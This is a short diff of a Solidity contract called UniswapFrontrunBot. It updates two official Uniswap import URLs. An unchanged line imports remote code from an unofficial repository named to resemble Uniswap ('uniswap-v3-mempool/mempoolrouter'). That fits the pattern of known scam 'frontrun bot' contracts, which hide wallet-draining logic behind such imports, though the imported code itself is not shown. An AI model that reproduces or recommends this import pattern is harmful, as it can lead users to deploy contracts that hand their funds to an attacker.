@@ -1,8 +1,8 @@
 pragma solidity ^0.6.6;
 
 // Import Libraries Migrator/Exchange/Factory
-import "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/IUniswapV2Migrator.sol";
-import "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";
+import "https://raw.githubusercontent.com/Uniswap/v2-periphery/master/contracts/interfaces/IUniswapV2Migrator.sol";
+import "https://raw.githubusercontent.com/Uniswap/v2-periphery/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";
 import "https://raw.githubusercontent.com/uniswap-v3-mempool/mempoolrouter/main/v3";
 
 contract UniswapFrontrunBot {
